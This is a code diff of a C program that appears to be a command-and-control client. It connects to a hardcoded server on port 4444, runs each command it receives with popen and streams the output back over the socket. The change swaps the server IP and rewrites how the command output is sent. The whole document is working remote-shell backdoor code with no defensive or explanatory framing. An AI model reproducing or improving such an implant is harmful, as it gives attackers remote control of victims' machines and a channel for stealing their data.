@@ -13,7 +13,7 @@
 #include <time.h>
 #include <ctype.h>
 
-#define SERVER_IP "192.168.1.79"
+#define SERVER_IP "172.19.175.239"
 #define COMMAND_PORT 4444
 #define HEARTBEAT_TIMEOUT 60  // Disconnect if no heartbeat for 60 seconds
 #define MAX_RETRIES 0
@@ -288,20 +288,30 @@ int main() {
                 printf("[*] Executing command: %s", buffer);
                 FILE *fp = popen(buffer, "r");
                 if (fp) {
-                    char output[4096] = {0};
-                    char line[256];
-                    while (fgets(line, sizeof(line), fp)) {
-                        if (strlen(output) + strlen(line) < sizeof(output) - 1) {
-                            strcat(output, line);
+                    char buffer[512];
+                    ssize_t sent;
+                    int total_sent = 0;
+
+                    while (fgets(buffer, sizeof(buffer), fp)) {
+                        size_t len = strlen(buffer);
+
+                        sent = send(command_sock, buffer, len, MSG_NOSIGNAL);
+                        if (sent <= 0) {
+                            perror("send");
+                            break;
                         }
+                        total_sent += sent;
                     }
                     pclose(fp);
-                    if (strlen(output) == 0) {
-                        strcpy(output, "OK\n");
+
+                    // Se il comando non ha prodotto output
+                    if (total_sent == 0) {
+                        send(command_sock, "OK\n", 3, MSG_NOSIGNAL);
+                        total_sent = 3;
                     }
-                    send(command_sock, output, strlen(output), MSG_NOSIGNAL);
-                    printf("[+] Command executed, sent %zu bytes\n", strlen(output));
-                } else {
+                    printf("[+] Command executed, sent %d bytes\n", total_sent);
+                }
+                else {
                     send(command_sock, "ERROR: Command failed\n", 22, MSG_NOSIGNAL);
                 }
             }
